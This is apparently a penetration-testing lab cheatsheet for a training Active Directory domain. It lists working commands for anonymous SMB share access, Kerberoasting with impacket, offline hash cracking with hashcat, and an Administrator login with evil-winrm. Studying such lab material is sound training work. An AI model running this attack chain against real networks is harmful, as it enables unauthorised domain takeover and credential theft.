# Cheatsheet — First Domain

## Targets

- **dc01** — sole DC for corp.pentrain.local
- **files01** — standalone SMB box with a leaked share (entry point)

## Useful commands

```bash
smbclient -N -L //<files01>/          # anonymous listing
smbclient -N //<files01>/share        # grab the leak
impacket-GetUserSPNs corp.pentrain.local/<user>:<pw> -dc-ip <dc01> -request
hashcat -m 13100 spns.txt rockyou.txt
evil-winrm -i <dc01> -u Administrator -p '<cracked>'
```

## Concepts

- Any domain user may request service tickets — SPNs are the roast list
- SYSVOL on a DC is world-readable to domain users — scripts + notes live there
- The share leak gives you the *first* domain cred; roasting gives the rest
